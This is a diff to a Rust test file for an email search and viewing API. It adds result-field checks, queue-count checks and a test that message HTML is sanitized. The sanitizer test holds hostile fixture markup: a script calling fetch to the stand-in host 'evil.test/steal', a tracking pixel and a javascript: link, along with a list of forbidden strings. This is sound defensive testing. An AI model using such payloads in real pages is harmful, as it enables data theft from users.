@@ -117,6 +117,11 @@ async fn search_returns_email_shaped_results(pool: PgPool) {
         "matched term was not marked"
     );
     assert!(hit["sent_at"].is_string());
+    // The result list renders a message, not a row: sender and labels come back
+    // with the page so it needs no follow-up request per hit.
+    assert_eq!(hit["from_address"], "ada@example.test");
+    assert_eq!(hit["from_display_name"], "Ada Fixture");
+    assert_eq!(hit["labels"][0], "Work");
 
     let (miss_status, miss) = get(app, "/api/email/search?q=nonexistentterm").await;
     assert_eq!(miss_status, StatusCode::OK);
@@ -268,4 +273,163 @@ async fn trashed_messages_are_excluded_from_search_by_default(pool: PgPool) {
 
     let (_, included) = get(app, "/api/email/search?q=Discarded&include_trashed=true").await;
     assert_eq!(included["results"].as_array().expect("results").len(), 1);
+}
+
+#[sqlx::test(migrations = "../db/migrations")]
+async fn status_separates_foreground_from_backfill_queue_depth(pool: PgPool) {
+    let foreground = seed(
+        &pool,
+        "New arrival",
+        "Freshly uploaded.",
+        "ada@example.test",
+        None,
+    )
+    .await;
+    let historical = seed(
+        &pool,
+        "Old archive",
+        "Ten years old.",
+        "ada@example.test",
+        None,
+    )
+    .await;
+    strife_db::enqueue_job(&pool, strife_db::JobType::EmailExtraction, foreground, 5)
+        .await
+        .expect("foreground job");
+    let campaign = strife_db::create_backfill_campaign(
+        &pool,
+        &strife_db::NewBackfillCampaign {
+            kind: strife_db::BackfillKind::Email,
+            candidate_definition: serde_json::json!({"version": 1}),
+            batch_size: 100,
+            max_queued: 500,
+            max_running: 1,
+            resource_class: strife_db::JobResourceClass::HeavyCpu,
+            foreground_fairness: 20,
+            created_by_version: "test".to_owned(),
+        },
+    )
+    .await
+    .expect("campaign");
+    strife_db::enqueue_job_with_context(
+        &pool,
+        strife_db::JobType::EmailExtraction,
+        historical,
+        20,
+        strife_db::JobOrigin::Backfill,
+        Some(campaign.id),
+        strife_db::JobResourceClass::HeavyCpu,
+    )
+    .await
+    .expect("backfill job");
+
+    let (status, body) = get(strife_api::email::router(pool), "/api/email/status").await;
+    assert_eq!(status, StatusCode::OK);
+    let counts = &body["counts"];
+    // A paused campaign and a stalled inbox must not look alike, so the two
+    // queues are never summed into one pending total.
+    assert_eq!(counts["foreground_pending"], 1);
+    assert_eq!(counts["backfill_pending"], 1);
+    assert_eq!(counts["foreground_running"], 0);
+    assert_eq!(counts["backfill_running"], 0);
+    assert_eq!(counts["remaining"], 2);
+    assert_eq!(counts["completed"], 2);
+    assert_eq!(counts["indexed"], 2);
+}
+
+#[sqlx::test(migrations = "../db/migrations")]
+async fn message_html_is_sanitized_before_it_leaves_the_api(pool: PgPool) {
+    let node_id = Uuid::new_v4();
+    sqlx::query("INSERT INTO nodes (id, parent_id, name, kind) VALUES ($1, $2, $3, 'file')")
+        .bind(node_id)
+        .bind(ROOT_NODE_ID)
+        .bind("hostile.eml")
+        .execute(&pool)
+        .await
+        .expect("create node");
+    replace_email_projection(
+        &pool,
+        &EmailProjection {
+            message: UpsertEmailMessage {
+                node_id,
+                status: EmailExtractionStatus::Completed,
+                parser_name: "mail-parser",
+                parser_version: "0.11.5",
+                message_id: None,
+                normalized_message_id: None,
+                in_reply_to: None,
+                reference_ids: &[],
+                subject: Some("Newsletter"),
+                normalized_subject: Some("Newsletter"),
+                sent_at: Some(Utc.with_ymd_and_hms(2016, 3, 2, 9, 0, 0).unwrap()),
+                received_at: None,
+                body_text: "Newsletter body.",
+                body_html: Some(
+                    r#"<p>Hello</p>
+                       <script>fetch('https://evil.test/steal')</script>
+                       <img src="https://tracker.test/open.gif" alt="pixel">
+                       <img src="cid:logo@news.test" alt="logo">
+                       <a href="javascript:alert(1)">bad</a>
+                       <a href="https://example.test/ok">good</a>"#,
+                ),
+                preview_text: "Newsletter body.",
+                content_hash: None,
+                provider_thread_id: None,
+                warnings: &["parser note".to_owned()],
+                duration_ms: None,
+            },
+            addresses: &[EmailAddressInput {
+                role: EmailAddressRole::From,
+                display_name: None,
+                address: "news@example.test",
+            }],
+            headers: &[],
+            labels: &[],
+            attachments: &[EmailAttachmentInput {
+                part_path: "2.1",
+                filename: Some("logo.png"),
+                media_type: "image/png",
+                disposition: Some("inline"),
+                content_id: Some("logo@news.test"),
+                transfer_encoding: Some("base64"),
+                decoded_size: Some(64),
+                checksum_sha256: None,
+                is_inline: true,
+                is_message: false,
+                warnings: &[],
+            }],
+        },
+    )
+    .await
+    .expect("seed projection");
+
+    let (status, body) = get(
+        strife_api::email::router(pool),
+        &format!("/api/email/messages/{node_id}"),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK);
+    let html = body["body_html"].as_str().expect("body_html");
+
+    // The client must never receive the original markup.
+    for forbidden in [
+        "<script",
+        "evil.test",
+        "tracker.test",
+        "javascript:",
+        "cid:",
+    ] {
+        assert!(!html.contains(forbidden), "{forbidden} survived: {html}");
+    }
+    // Inline reference resolved to this message's own part endpoint.
+    assert!(
+        html.contains(&format!("/api/email/messages/{node_id}/parts/2.1")),
+        "{html}"
+    );
+    assert!(html.contains("https://example.test/ok"), "{html}");
+    assert!(html.contains("noopener"), "{html}");
+    assert_eq!(body["blocked_remote_count"], 1);
+    assert_eq!(body["blocked_hosts"][0], "tracker.test");
+    // Parser warnings survive alongside any the sanitizer adds.
+    assert_eq!(body["warnings"][0], "parser note");
 }
